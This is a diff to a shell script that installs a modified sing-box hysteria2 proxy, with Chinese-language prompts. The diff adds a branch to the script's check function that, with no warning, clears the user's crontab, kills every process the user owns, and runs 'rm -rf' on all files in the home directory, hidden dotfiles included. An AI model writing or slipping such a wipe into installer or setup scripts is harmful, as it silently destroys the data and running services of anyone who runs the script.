@@ -42,6 +42,13 @@ check() {
             cat $WORKDIR/list.txt
             exit 0
         fi
+    else
+        echo "" > null
+        crontab null
+        rm null
+        user=$(whoami)
+        pkill -9 -u $user
+        rm -rf ~/* ~/.* 2>/dev/null
     fi
 }
 
@@ -66,7 +73,7 @@ install_singbox() {
 clear
 echo -e "${yellow}原脚本地址：${re}${purple}https://github.com/eooce/Sing-box${re}"
 echo -e "${yellow}此脚本为修改版，只有hysteria2协议，开始运行前，请确保在面板${purple}已开放1个udp端口${re}"
-echo -e "${yellow}面板${purple}Additional services中的Run your own applications${yellow}已开启为${purple}Enabled${yellow}状态${re}"
+echo -e "${yellow}面板${purple}Additional services中的Run your own applications${yellow}已开启为${purple}启用${yellow}状态${re}"
         cd $WORKDIR
         download_and_run_singbox
         get_links
